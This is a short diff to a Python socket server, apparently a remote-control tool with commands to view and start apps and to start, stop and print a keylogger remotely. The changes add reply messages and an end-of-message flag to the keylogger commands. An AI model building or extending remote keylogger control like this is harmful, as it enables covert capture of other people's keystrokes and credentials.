@@ -20,6 +20,7 @@ CMD_VIEW_APPS = 'view_apps'
 CMD_START_APP = 'start_app'
 
 # FLAGS
+FLAG_MSG_END = 'MSG_END'
 FLAG_FILE_END = 'FILE_END'
 FLAG_PROCESSES_END = 'PROCESSES_END'
 FLAG_APPS_END = 'APPS_END'
@@ -99,9 +100,13 @@ class Server:
             self.start_keylogger()
             lock += 1
             print(f'[KEYLOGGER] {addr} started keylogger.')
+            conn.send('Keylogger started.'.encode())
           else:
             print(f'[KEYLOGGER] {addr} requested start keylogger, but keylogger is already running.')
-            # conn.send('Keylogger is already running.'.encode())
+            conn.send('Keylogger is already running.'.encode())
+            
+          time.sleep(0.01)
+          conn.send(FLAG_MSG_END.encode())
 
         # Stop keylogger
         elif data == CMD_STOP_KEYLOGGER.encode():
@@ -110,10 +115,14 @@ class Server:
             self.stop_keylogger()
             lock -= 1
             print(f'[KEYLOGGER] {addr} stopped keylogger.')
+            conn.send('Keylogger stopped.'.encode())
           else:
             print(f'[KEYLOGGER] {addr} requested stop keylogger, but keylogger is not running.')
-            # conn.send('Keylogger is not running.'.encode())
+            conn.send('Keylogger is not running.'.encode())
 
+          time.sleep(0.01)
+          conn.send(FLAG_MSG_END.encode())
+          
         # Print keylogger
         elif data == CMD_PRINT_KEYLOGGER.encode():
           print(f'[KEYLOGGER] {addr} requested print keylogger.')
